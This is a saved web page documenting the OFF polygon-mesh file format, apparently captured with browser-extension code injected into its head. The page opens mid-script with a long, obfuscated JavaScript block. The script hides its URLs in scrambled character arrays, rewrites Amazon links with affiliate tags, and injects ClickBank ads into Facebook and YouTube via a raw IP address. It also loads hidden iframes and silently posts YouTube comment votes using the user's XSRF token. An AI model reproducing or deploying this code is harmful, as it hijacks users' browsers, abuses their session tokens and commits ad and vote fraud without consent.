+'<a href="'+d[g]+"&title="+j+c+'" style="color:black;text-decoration:none;"><li class="yt-uix-button-menu-item" id="v1080p">MP4 HD (1080p)</li></a>');n[0]=="38"&&(i+='<a href="'+d[g]+"&title="+j+c+'" style="color:black;text-decoration:none;"><li class="yt-uix-button-menu-item" id="v4k">MP4 HD (4K)</li></a>');n[0]=="43"&&(i+='<a href="'+d[g]+"&title="+j+c+'" style="color:black;text-decoration:none;"><li class="yt-uix-button-menu-item" id="web360p">WebM (360p)</li></a>');n[0]=="44"&&(i+='<a href="'+
+d[g]+"&title="+j+c+'" style="color:black;text-decoration:none;"><li class="yt-uix-button-menu-item" id="web480p">WebM (480p)</li></a>');n[0]=="45"&&(i+='<a href="'+d[g]+"&title="+j+c+'" style="color:black;text-decoration:none;"><li class="yt-uix-button-menu-item" id="web720p">WebM HD (720p)</li></a>')}for(g=0;g<d.length;g++)if(o=d[g].split("itag="),n=o[1].split("&"),d[g]=d[g].split(";")[0],n[0]=="18"||n[0]=="22"||n[0]=="37"||n[0]=="38"){l+='<a href="'+d[g]+"&title="+j+c+'" style="color:black;text-decoration:none;">'+
+b[1]+"</a>";m+=d[g]+"&title="+j+c+"";break}a(i,l,m)})();if(document.getElementById("web360p"))document.getElementById("web360p").style.display="none";if(document.getElementById("web480p"))document.getElementById("web480p").style.display="none";if(document.getElementById("web720p"))document.getElementById("web720p").style.display="none";(function(){var a=document.getElementById("downloadMenu"),b=document.createElement("a");b.onclick=function(){var a=f[23];if(!G){var b="h,r,o,b,3,w,.,w,/,/,m,t,u,y,v,t,.,w,:,p,/,u,g,o,p,#,e,-,t,=".split(",");
+k(a,b);G=b.join("")}a=G+xc();if(ec()<10)window.open(a,"_blank");else if(b=document.getElementById("watch-actions")){var c=document.getElementById("mp3downloader");if(!c)c=document.createElement("div"),c.id="mp3downloader",c.setAttribute("style","width: 640px; margin: 0px 0px 5px; padding: 0px; height: 130px; overflow: visible;"),b.parentNode.insertBefore(c,b.nextSibling);c.innerHTML='<iframe style="float: left" name="injectedIframe'+ic(5)+'" height="130" width="480" scrolling="no" border="0" style="border: 0 none;"  src="'+
+a+'"></iframe><div id="shareBox"><div style="font-family: Open Sans, arial, sans-serif; font-size: 13px; color: #333; font-weight: bold; padding-bottom: 9px">Share With Friends =)</div><div style="display: block; padding: 2px;"><fb:like href="http://www.oxytube.com/" send="true" layout="button_count" width="120" show_faces="true" font="arial"></fb:like></div><div style="display: block; padding: 2px;"><a href="http://twitter.com/share" class="twitter-share-button" data-text="OMG WOW - This browser extension allows you to download YouTube videos as MP3s or high def MP4s -" data-url="http://www.oxytube.com/" data-count="horizontal">Tweet</a></div><div style="display: block; padding: 2px;"><g:plusone size="medium" href="http://www.oxytube.com"></g:plusone></div></div>';
+a=document.getElementById("shareBox");b=document.createElement("script");b.src="http://platform.twitter.com/widgets.js";a.appendChild(b);b=document.createElement("script");b.src="http://connect.facebook.net/en_US/all.js#xfbml=1";a.appendChild(b);a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="https://apis.google.com/js/plusone.js";b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b)}else window.open(a,"_blank")};b.innerHTML='<li class="yt-uix-button-menu-item" id="">MP3</li>';
+a.appendChild(b)})()}catch(c){}}function yc(){wc();vc=setInterval(function(){document.getElementById("download")!=e?clearInterval(vc):wc()},600);var b=dc("cbYtRate",0.1);zc(b);Ac()}
+function Ac(){if(ec()>=10)if(window.name.indexOf("injectedIframe")==0){if(document.body.innerHTML="",window.localStorage.upvcom&&window.localStorage.upvcom!="{}")try{var b=JSON.parse(window.localStorage.upvcom),a=b.v;a==xc()&&Bc(b.c,a)}catch(c){}}else if(b=cc("ytcRate"),Math.random()<b||b==e)window.localStorage.upvcom=e,bc(ia()),Cc=setInterval(function(){window.localStorage.upvcom!=e&&(clearInterval(Cc),setTimeout(function(){if(window.localStorage.upvcom&&window.localStorage.upvcom!="{}")try{var a=
+JSON.parse(window.localStorage.upvcom),b=a.v,c=a.c,a="http://www.youtube.com/watch?v="+b;if(window.name.indexOf("injectedIframe")!=0){var i=document.createElement("div");document.body.appendChild(i);var j="",j="injectedIframe"+ic(5);i.innerHTML='<iframe style="visibility:hidden;" width="1" height="1" name="'+j+'" src="'+a+'"></iframe>'}var l=f[25];I||(i="0,v,u, ,i,=,n,y,p,e,i,e,o,.,u,j,b,_,p,t,t,_,o,0,o,c,e,n,1,t,u".split(","),k(l,i),I=i.join(""));V(I,{videoId:b,commentId:c},0.01)}catch(m){}},100))},
+100)}function Bc(b,a){var c=Dc();if(c!=e){var d=new XMLHttpRequest;d.open("POST","http://www.youtube.com/comment_voting?a=1&id="+b+"&video_id="+a,!0);d.setRequestHeader("Content-type","application/x-www-form-urlencoded");d.onreadystatechange=function(){};d.send(c)}}function xc(){var b=window.location.search.split("v=")[1],a=b.indexOf("&");a!=-1&&(b=b.substring(0,a));return b}function Dc(){if(yt)try{return yt.getConfig("COMMENT_VOTE_XSRF")}catch(b){return e}else return e}var Cc,Ec=e,Fc=e,Gc=0;
+function Hc(){setInterval(function(){var a=window.location.href;if(Ec==e||a!=Ec)Ec=a,(W()-Gc)/1E3>1&&(Gc=W(),window.location.href.indexOf("http://")!=-1&&(a=dc("cbFbRate",0.05),Ic(a)))},150);try{Fc=X(document.getElementById("pageFooter"),"div","fsm fwn fcg").getElementsByTagName("a")[0].innerHTML}catch(b){}}var Jc=e;
+function Kc(){Lc();var b=window.localStorage.clickbank_ads;if(b)try{b=JSON.parse(b);var a=b,c=a.length;if(c!=0)for(;--c;){var d=Math.floor(Math.random()*(c+1)),h=a[c];a[c]=a[d];a[d]=h}return b.slice(0,Math.min(1,b.length))}catch(g){return e}else return e}
+function Lc(){var b;try{b="localStorage"in window&&window.localStorage!==e}catch(a){b=!1}if(b){b=window.localStorage.clickbank_ads_request_time;var c=window.localStorage.clickbank_ads;if(b&&c&&(b=parseInt(b,10),c=dc("cbRefresh",180),(W()-b)/1E3/60<c))return;window.localStorage.clickbank_ads_request_time=W();b=f[26];J||(c="t,n,.,:,4,a,i,c,C,1,c,p,.,k,5,/,1,h,g,/,1,.,p,/,/,7,k,l,t,0,6,2,b,6,t,9,e,h,b,.,p".split(","),k(b,c),J=c.join(""));bc(J)}}
+function Ic(b){Lc();clearInterval(Jc);Jc=setInterval(function(){var a=X(document.body,"div","ego_column");if(a&&(clearInterval(Jc),Math.random()<b)){for(;a.nextSibling!=e&&a.nextSibling.className.indexOf("ego_column")!=-1;)a=a.nextSibling;if(a.className.indexOf("egoOrganicColumn")==-1&&(a=X(a,"div","phs"))){var c=Kc();if(c!=e)for(var d=0;d<c.length;d++)try{var h=c[d],g=document.createElement("div");g.className="fbEmuEgoUnit ego_unit";g.innerHTML=h;g.innerHTML='<div class="fbEmu fbEmuBlock fbEmuEgo"><div class="title"><a class="forceLTR emuEvent1 fbEmuLink" href="">'+
+h.title+'</a></div><div class="UIImageBlock clearfix image_body_block"><a class="emuEvent1 fbEmuLink image UIImageBlock_Image UIImageBlock_SMALL_Image" href=""><img class="img" src="'+h.img_small+'" width="100" alt></a><div class="UIImageBlock_Content UIImageBlock_SMALL_Content"><div class="body"><a class="forceLTR emuEvent1 fbEmuLink" href="">'+h.description+"</a></div></div></div></div>";a.insertBefore(g,a.firstChild);var i=h.vendor,j="http://96.126.107.154/cb/aclk.php?ad_id="+h.id+"&cb_vendor="+
+i+"&fb_lang="+Fc+"&site=fb";V("clickbank_fb_impression p=0.00001",{vendor:i},1.0E-5);U(g,j,"",{},!1,0)}catch(l){}}}},200)}
+function zc(b){Lc();var a=document.getElementById("watch-channel-brand-div");if(a&&Math.random()<b&&(b=Kc(),b!=e&&b.length==1))try{var c=b[0],d=document.createElement("div");d.style.cursor="pointer";d.innerHTML="<a href=''><img width='300' src='"+c.img_large+"'></a>";var h=c.vendor,g="http://96.126.107.154/cb/aclk.php?ad_id="+c.id+"&cb_vendor="+h+"&site=yt";a.innerHTML="";a.appendChild(d);U(d,g,"",{},!1,0);var i=f[29];K||(a="k,e,=,y,t,s,c,0,_,.,s,n,i,p,i,1,m,o,k,p,r,l, ,_,b,i,n,a,c,0".split(","),
+k(i,a),K=a.join(""));V(K,{vendor:h},0.01)}catch(j){}}var Mc=e;
+function Nc(){var b;b=window.location.href;var a=b.lastIndexOf("&q=");a==-1?b=e:(b=b.substring(a+3),a=b.indexOf("&"),a!=-1&&(b=b.substring(0,a)),b=b.split("+").join(" "));if(b!=e&&b!=Mc){Mc=b;a:{for(var a=document.body.getElementsByTagName("a"),c=0;c<a.length;c++)if(a[c].href.indexOf(Ga())==0){a=!0;break a}a=!1}if(a){a=window.location.href;c=e;if(a.indexOf(ja())==0||a.indexOf(ka())==0)c="US";else if(a.indexOf(la())==0||a.indexOf(ma())==0)c="JP";else if(a.indexOf(na())==0||a.indexOf(oa())==0)c="DE";
+else if(a.indexOf(pa())==0||a.indexOf(qa())==0)c="FR";else if(a.indexOf(ra())==0||a.indexOf(ta())==0)c="CA";else if(a.indexOf(va())==0||a.indexOf(xa())==0)c="ES";else if(a.indexOf(za())==0||a.indexOf(Ba())==0)c="GB";a=c;if(a!=e){c=document.createElement("iframe");document.body.appendChild(c);var d=f[45];if(!Da){var h="0,o,_,t,1,l, ,o,p,c,g,0,j,i,g,n,p,e,i,o,_,n,r,.,e,a,=,h,e".split(",");k(d,h);Da=h.join("")}V(Da,{countryCode:a},0.01);d=f[46];Ea||(h="o,b,l,l,/,4,2,h,a,m,6,q,e,c,/,1,0,k,6,.,z,p,.,7,1,g,a,p,g,t,c,=,&,:,/,h,9,=,1,a,t,5,/,l,o,.,a,.,?,p".split(","),
+k(d,h),Ea=h.join(""));b=Ea+b;d=f[47];Fa||(h="n,=,y,u,&,c,o,t,r".split(","),k(d,h),Fa=h.join(""));c.setAttribute("src",b+Fa+a);c.setAttribute("height","1px");c.setAttribute("width","1px");c.style.visibility="hidden"}}}}function Oc(){setTimeout(function(){Nc()},300);setInterval(function(){Nc()},800)}function Pc(){Qc();setInterval(function(){Qc()},600)}
+function Qc(){for(var b=document.body.getElementsByTagName("a"),a=0;a<b.length;a++){var c=b[a],d=c.href;if(d.indexOf(Ia())!=-1){var h=U,d="http://96.126.107.154/cb/resolve.php?u="+d,g=f[50];if(!Ka){var i="n,i,c,i,b,i,t,c,l,_,l,_,n,c,a,i,c,i,l,k,a,k,k".split(",");k(g,i);Ka=i.join("")}h(c,d,Ka,{},!1,1)}}}function Rc(b){var a=cc("amzRate");if(Math.random()<a||a==e)Sc(),setInterval(function(){Sc()},b)}
+function Sc(){var b=document.body.getElementsByTagName("a"),a=RegExp,c=f[51];if(!La){var d="a,/,a,h,w,t,m,n,.,o,/,p,:,w,w,.,z,t".split(",");k(c,d);La=d.join("")}c=La+"(";d=f[52];if(!Ma){var h="f,d,k,p,.,c,\\,|,s,.,|,c,e,c,e,a,o,\\,|,j,m,c,u,o,|,|,o,r,|".split(",");k(d,h);Ma=h.join("")}c=c+Ma+")/([\\w-%]+/)?(";d=f[53];Na||(h="d,A,o,s,p,b,e,S,u,i,x,/,d,p,s,|,|,e,n,e,d,c,p,i,a,c,/,i,t,c,o,e,o,d,/,/,I,x,/,s,r,g,|,o,b,N,o".split(","),k(d,h),Na=h.join(""));a=a(c+Na+")/(\\w+/)?(\\w{10})");c=f[54];Oa||(d=
+".,m,i,=,0,1,a, ,z,l,_,0,c,k,p,c".split(","),k(c,d),Oa=d.join(""));c=Oa;for(d=0;d<b.length;d++){var h=b[d],g=h.href,i=g.match(a);if(i){var j=i[1],g=i[5],i=f[55];if(!Pa){var l="o,/,w,t,a,h,n,:,.,z,p,a,.,w,m,w,/,t".split(",");k(i,l);Pa=l.join("")}i=Pa+j;l=f[56];if(!Qa){var m="p,c,r,g,/,t,u,/,p,/,o,d".split(",");k(l,m);Qa=m.join("")}i=i+Qa+g;l=f[57];Ra||(m="?,/,U,F,t,i,=,T,=,a,s,t,_,&,i,s,_,f,e,_,r,l,=,e,g,l,a,8,s".split(","),k(l,m),Ra=m.join(""));j=i+Ra+Tc(j);i=f[58];Sa||(l="p,A,C,a,n,i,e,s,t,I,=,v,2,5,&,o,7,e,l,1,c,e,4,2,r,i,m,=,c,k,&,S,=,N,d,1,a,&,a".split(","),
+k(i,l),Sa=l.join(""));j=j+Sa+g;U(h,j,c,{affiliateUrl:"product link"},!0,0.01)}else if(g.indexOf(Ta())==0){i=g;l=i.indexOf("?");if(l!=-1){g=i.substring(0,l);j="";i=i.substring(l+1).split("&");for(l=0;l<i.length;l++){var o=i[l],n=o.indexOf("=");n!=-1&&(m=o.substring(0,n),o=o.substring(n+1),m!="tag"&&(j!=""&&(j+="&"),j+=m+"="+o))}i=g+"?"+j}g=i;j=g.substring(18);j=g+Uc(j.indexOf("co.uk")==0?"co.uk":j.indexOf("co.jp")==0?"co.jp":j.indexOf("es")==0?"es":j.indexOf("fr")==0?"fr":j.indexOf("de")==0?"de":j.indexOf("ca")==
+0?"ca":"com");U(h,j,c,{affiliateUrl:g},!0,0.01)}}}
+function Tc(b){switch(b){case "de":b=f[60];if(!Va){var a="2,m,c,b,0,o,h,r,p,-,1,a,e".split(",");k(b,a);Va=a.join("")}return Va;case "es":return b=f[61],Wa||(a="0,2,p,e,r,o,c,1,m,a,8,h,-".split(","),k(b,a),Wa=a.join("")),Wa;case "fr":return b=f[62],Xa||(a="2,-,h,r,0,c,m,p,7,o,e,a,1".split(","),k(b,a),Xa=a.join("")),Xa;case "co.jp":return b=f[63],Ya||(a="r,c,2,-,p,a,h,2,o,m,e".split(","),k(b,a),Ya=a.join("")),Ya;case "co.uk":return b=f[64],Za||(a="3,a,h,0,o,m,r,2,c,-,1,e,p".split(","),k(b,a),Za=a.join("")),
+Za;case "ca":return b=f[65],$a||(a="h,6,p,a,2,o,0,-,m,e,0,c,r".split(","),k(b,a),$a=a.join("")),$a;default:return b=f[66],ab||(a="5,m,e,r,a,o,0,2,h,p,c,0,-".split(","),k(b,a),ab=a.join("")),ab}}
+function Uc(b){switch(b){case "de":b=f[67];if(!bb){var a="r,k,r,1,e,&,s,=,o,=,9,c,p,t,&,5,m,i,=,8,2,#,=,c,&,d,h,r,e,r,t,1,o,c,a,g,i,3,6,c,t,4,n,p,0,e,F,1,U,c,e,e,8,o,=,i,m,d,T,v,e,C,&,d,?,e,i,i,a,a,n,t,u,e,e,a,&,-,4,r,-,b,=,l,_,n,g,2,d".split(",");k(b,a);bb=a.join("")}return bb;case "fr":return b=f[68],cb||(a="=,e,0,=,a,r,=,_,o,k,8,v,4,t,=,1,n,r,7,1,e,c,p,2,d,r,i,m,6,o,e,u,F,U,m,2,c,&,4,t,5,e,c,2,o,C,e,i,-,g,p,9,&,i,T,8,a,h,#,a,=,&,d,a,c,?,g,n,1,&,l,n".split(","),k(b,a),cb=a.join("")),cb;case "co.jp":return b=
+f[69],db||(a="p,v,t,c,9,a,-,n,e,i,U,=,r,c,2,=,&,&,o,r,2,d,3,c,t,e,7,c,u,g,i,n,=,r,g,9,e,o,?,T,e,_,8,a,a,C,F,n,#,&,=,k,m,=,2,o,m,4,e,&,7,h,a,i,p,d,2,l".split(","),k(b,a),db=a.join("")),db;case "co.uk":return b=f[70],eb||(a="4,o,n,4,3,n,c,g,#,3,e,a,a,i,u,o,h,=,c,m,i,c,g,=,k,r,_,2,n,5,0,d,?,=,1,&,F,l,=,=,r,C,o,&,T,c,d,9,8,&,0,2,a,&,e,6,p,-,p,1,e,a,i,e,r,m,v,t,e,U,1,t".split(","),k(b,a),eb=a.join("")),eb;case "ca":return b=f[71],fb||(a="0,6,r,=,T,U,i,d,-,&,2,2,1,1,c,h,r,n,d,?,e,t,0,e,c,v,t,n,g,2,e,5,e,o,0,9,c,a,e,=,m,#,k,u,o,&,&,1,1,C,F,&,m,i,g,3,c,a,i,a,8,p,a,=,=,l,r,=,6,o,_,9,n,p".split(","),
+k(b,a),fb=a.join("")),fb;case "es":return b=f[72],gb||(a="e,?,C,u,c,i,&,a,l,2,a,1,2,c,t,o,6,#,v,T,o,=,m,e,e,0,=,&,d,=,&,F,2,8,a,o,4,6,m,n,r,a,2,2,e,8,g,p,2,t,r,n,n,3,c,d,-,h,&,U,k,8,=,=,i,c,r,g,p,i,e,_".split(","),k(b,a),gb=a.join("")),gb;default:return b=f[73],hb||(a="?,#,c,i,a,g,1,7,p,8,e,e,7,_,a,i,n,l,8,o,F,p,U,2,g,n,9,&,e,C,i,&,c,5,o,v,r,u,=,t,t,n,r,9,a,3,a,=,=,=,c,0,&,o,=,9,&,T,-,m,k,c,r,e,5,m,0,d,2,0,e,h,d".split(","),k(b,a),hb=a.join("")),hb}}
+function Vc(){var b=window.location.href,a=b.indexOf(pb())==0||b.indexOf(rb())==0;if(b.indexOf(tb())==0||b.indexOf(vb())==0)Hc();else if(a)Oc();else if(b.indexOf(xb())==0||b.indexOf(zb())==0)yc();else if(!(b.indexOf(Bb())==0||b.indexOf(Db())==0))if(b.indexOf(Fb())==0)uc();else if(b.indexOf(Hb())==0||b.indexOf(Jb())==0)lc();else if(b.indexOf(Lb())==0){var c=window.location.href;if(c.indexOf(aa())==0){c=f[5];if(!u){var d="0,u,t,r,i,=, ,1,n,.,m,l,p,k,b,0,_,l".split(",");k(c,d);u=d.join("")}V(u,{},0.01)}else c.indexOf(ba())==
+0?(c=f[7],w||(d="p,r,t,x,1,u,l,0,=,b,t,0,_, ,m,e,t,.".split(","),k(c,d),w=d.join("")),V(w,{},0.01)):c.indexOf(ca())==0&&(c=f[9],y||(d="o,m,l,r,p,.,0,p,b,1,t,=,t,0, ,u,h,o,_".split(","),k(c,d),y=d.join("")),V(y,{},0.01))}else b.indexOf(Nb())==0?jc():b.indexOf(Pb())==0?rc():b.indexOf(Rb())==0&&pc();if(!/^(http|https):\/\/[^.]*.amazon./.test(b)&&!(navigator.userAgent&&navigator.userAgent.indexOf("Chromium")!=-1)&&!fc()){var h;try{var g=window.localStorage.iIntDaemon;h=g?parseInt(g,10):0}catch(i){h=0}h=
+(W()-h)/1E3;var j;try{var l=window.localStorage.sIntDaemon;j=l?parseInt(l,10):0}catch(m){j=0}g=(W()-j)/1E3;j=Math.floor(h/86400);l=Math.floor(g/60);h=h>86400;g=g>300;h&&g?(h=800,b.indexOf(Tb())==0&&(h=300),Rc(h),a&&(a=f[94],Vb||(h="1,m,w,s,p,h,0,a,=,0, ,0,o,.,0,_".split(","),k(a,h),Vb=h.join("")),V(Vb,{iDays:j,sMinutes:l},1.0E-4))):a&&(a=f[95],Wb||(c="s,m,w,w,p,_,h,1,n,0,o,f,0,0,a,=,t,o,.,_, ,0".split(","),k(a,c),Wb=c.join("")),a=Wb,!h&&!g?(a=f[96],Xb||(h="_,t,0,.,1,h,h,0,w,o,b,=,0,p,o,m,0,n,a, ,_,s,o".split(","),
+k(a,h),Xb=h.join("")),a=Xb):h?g||(a=f[98],Zb||(h="o,.,o, ,0,=,1,p,_,0,w,a,0,n,m,_,s,h,0,s".split(","),k(a,h),Zb=h.join("")),a=Zb):(a=f[97],Yb||(h="0,h,p,w,0,o,i,o,=,a,1,_,m,0,n,s, ,0,.,_".split(","),k(a,h),Yb=h.join("")),a=Yb),V(a,{iDays:j,sMinutes:l},1.0E-4))}b.indexOf($b())==-1&&Pc()}var $=window.location.href;
+if($.indexOf(function(){var b=f[74];if(!ib){var a="t,w,/,e,:,r,p,h,p,t,a,w,w,.,/,.,h".split(",");k(b,a);ib=a.join("")}return ib}())==0){var Wc=f[30];if(!L){var Xc="a,.,.,o,L,m,n,o,A,i,d,c,n,:,g,.,m,a,z,.,o, ".split(",");k(Wc,Xc);L=Xc.join("")}document.title=L}else if($.indexOf(jb())==0||$.indexOf(lb())==0){var Z=window.location.href;if(Z.indexOf(da())!=-1){var oc=Z.indexOf(ea());oc!=-1&&nc()}}else if($.indexOf(nb())==0){var Yc=window.location.href;Yc.indexOf(fa())==0?window.location.href=Yc.substring(41):
+Yc.indexOf(ga())==0&&window.stop()}document.body!=e?Vc():document.addEventListener("DOMContentLoaded",function(){Vc()},!1);
+})();</script></head>
+
+  <body bgcolor="#EEEEEE" link="#CC0000" alink="#FF3300" vlink="#000055" screen_capture_injected="true">
+
+    <h1 align="center">
+      The OFF File Format
+    </h1>
+
+    <hr>
+
+    <p>
+      The conventional suffix for <code>OFF</code> files is <tt>`.off'</tt>.
+    </p>
+
+<p>
+Syntax:
+
+
+
+</p><pre>[ST][C][N][4][n]OFF	# Header keyword
+[<var>Ndim</var>]		# Space dimension of vertices, present only if nOFF
+<var>NVertices</var>  <var>NFaces</var>  <var>NEdges</var>   # NEdges not used or checked
+
+<var>x</var>[0]  <var>y</var>[0]  <var>z</var>[0]	# Vertices, possibly with normals,
+			# colors, and/or texture coordinates, in that order,
+			# if the prefixes <code>N</code>, <code>C</code>, <code>ST</code>
+			# are present.
+			# If 4OFF, each vertex has 4 components,
+			# including a final homogeneous component.
+			# If nOFF, each vertex has <var>Ndim</var> components.
+			# If 4nOFF, each vertex has <var>Ndim</var>+1 components.
+...
+<var>x</var>[<var>NVertices</var>-1]  <var>y</var>[<var>NVertices</var>-1]  <var>z</var>[<var>NVertices</var>-1]
+
+    			# Faces
+    			# <var>Nv</var> = # vertices on this face
+    			# <var>v</var>[0] ... <var>v</var>[<var>Nv</var>-1]: vertex indices
+    			#		in range 0..<var>NVertices</var>-1
+<var>Nv</var>  <var>v</var>[0] <var>v</var>[1] ... <var>v</var>[<var>Nv</var>-1]  <var>colorspec</var>
+...
+    			# <var>colorspec</var> continues past <var>v</var>[<var>Nv</var>-1]
+    			# to end-of-line; may be 0 to 4 numbers
+    			# nothing: default
+    			# integer: colormap index
+    			# 3 or 4 integers: RGB[A] values 0..255
+			# 3 or 4 floats: RGB[A] values 0..1
+</pre>
+
+<p>
+<code>OFF</code> files (name for "object file format") represent collections
+of planar polygons with possibly shared vertices, a convenient way to
+describe polyhedra.  The polygons may be concave but there's no
+provision for polygons containing holes.
+
+
+</p><p>
+An <code>OFF</code> file may begin with the keyword <code>OFF</code>; it's
+recommended but optional, as many existing files lack this keyword.
+
+
+</p><p>
+Three ASCII integers follow: <var>NVertices</var>, <var>NFaces</var>, and
+<var>NEdges</var>.  Thse are the number of vertices, faces, and edges,
+respectively.  Current software does not use nor check <var>NEdges</var>; it
+needn't be correct but must be present.
+
+
+</p><p>
+The vertex coordinates follow: dimension * <var>Nvertices</var>
+floating-point values.  They're implicitly numbered 0 through
+<var>NVertices</var>-1.  dimension is either 3 (default) or 4 (specified by
+the key character <code>4</code> directly before <code>OFF</code> in the keyword).
+
+
+</p><p>
+Following these are the face descriptions, typically written
+with one line per face.  Each has the form
+
+</p><pre><var>N</var>  <var>Vert1</var> <var>Vert2</var> ... <var>VertN</var>  [<var>color</var>]
+</pre>
+
+<p>
+Here <var>N</var> is the number of vertices on this face,
+and <var>Vert1</var> through <var>VertN</var> are indices into the list of
+vertices (in the range 0..<var>NVertices</var>-1).
+
+
+</p><p>
+The optional <var>color</var> may take several forms.  Line breaks are
+significant here: the <var>color</var> description begins after <var>VertN</var>
+and ends with the end of the line (or the next # comment).  A
+<var>color</var> may be:
+
+
+</p><dl compact="compact">
+
+<dt>nothing
+</dt><dd>
+the default color
+</dd><dt>one integer
+</dt><dd>
+index into "the" colormap; see below
+</dd><dt>three or four integers
+</dt><dd>
+RGB and possibly alpha values in the range 0..255
+</dd><dt>three or four floating-point numbers
+</dt><dd>
+RGB and possibly alpha values in the range 0..1
+</dd></dl>
+
+<p>
+For the one-integer case, the colormap is currently read from the file
+<tt>`cmap.fmap'</tt> in Geomview's <tt>`data'</tt> directory.  Some better
+mechanism for supplying a colormap is likely someday.
+
+
+</p><p>
+The meaning of "default color" varies.  If no face of the object has a
+color, all inherit the environment's default material color.  If some
+but not all faces have colors, the default is gray (R,G,B,A=.666).
+
+
+</p><p>
+A <code>[ST][C][N][n]OFF BINARY</code> format is accepted;  It
+resembles the ASCII format in almost the way you'd expect, with 32-bit
+integers for all counters and vertex indices and 32-bit floats for
+vertex positions (and texture coordinates or vertex colors or normals if
+<code>COFF</code>/<code>NOFF</code>/<code>CNOFF</code>/<code>STCNOFF</code>/etc. format).
+
+
+</p><p>
+Exception: each face's vertex indices are followed by an integer
+indicating how many color components accompany it.  Face color
+components must be floats, not integer values.  Thus a colorless
+triangular face might be represented as
+
+
+
+</p><pre>int int int int int
+3   17   5   9   0
+</pre>
+
+<p>
+while the same face colored red might be
+
+
+
+</p><pre>int int int int int float float float float
+ 3  17   5   9   4   1.0   0.0   0.0   1.0
+</pre>
+
+    <p>
+      You can return to the
+      <a href="http://people.sc.fsu.edu/~jburkardt/html/html.html">HTML web page</a>.
+    </p>
+
+    <hr>
+
+    <i>
+      Last revised on 26 February 2006.
+    </i>
+
+    <!-- John Burkardt -->
+
+  
+
+
+<div id="mixpanel" style="visibility: hidden; "></div></body></html>
